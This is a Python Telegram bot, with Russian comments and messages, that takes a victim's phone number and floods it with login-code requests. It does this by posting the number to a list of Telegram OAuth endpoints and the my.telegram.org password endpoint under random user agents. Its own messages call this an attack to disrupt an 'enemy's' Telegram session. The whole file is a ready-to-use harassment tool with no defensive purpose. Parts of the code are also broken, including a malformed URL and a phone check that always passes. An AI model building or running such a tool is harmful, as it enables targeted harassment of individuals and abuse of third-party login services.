import logging
import requests
import fake_useragent
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Функция для отправки запросов 
def send_requests(phone_number, repeat_count=3):
    count = 0
    for _ in range(repeat_count):
        try:
            user_agent = fake_useragent.UserAgent().random
            headers = {'user-agent': user_agent}
            data = {'phone': phone_number}

            urls = [
                'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
                'https://translations.telegram.org/auth/request',
                'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
                'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
                'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
                'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
                'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
                'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
                'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
                'https://my.telegram.org/auth/send_password'
            ]

            for url in urls:
                requests.post(url, headers=headers, data=data)

            count += 1
            return f"Атака завершилась успешно. \nВсего циклов: {count}"
        except Exception as e:
            return f"[!] Ошибка при отправке запросов: {str(e)}"

# Команда /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Приветствую тебя, я бот который поможет тебе с н е с т и сессию тг у недруга.\n"
        "Отправь мне номер телефона в формате +ХXXXXXXXXXX"
    )

# Обработка сообщений с номером телефона
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone_number = update.message.text
    
    # Проверка формата номера
    if phone_number.startswith('+375' '+7' ) and len(phone_number) == 13 or 12:
        result = send_requests(phone_number)
        await update.message.reply_text(result)
    else:
        await update.message.reply_text(
            "Неверный формат номера!\n"
            "Пожалуйста, отправьте номер в формате +ХXXXXXXXXXX"
        )

# Основная функция
def main():
    # Замените 'YOUR_TELEGRAM_BOT_TOKEN' на токен вашего бота
    application = Application.builder().token('YOUR_TELEGRAM_BOT_TOKEN').build()
    
    # Регистрация обработчиков
    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    
    # Запуск бота
    application.run_polling()

if __name__ == '__main__':
    main()
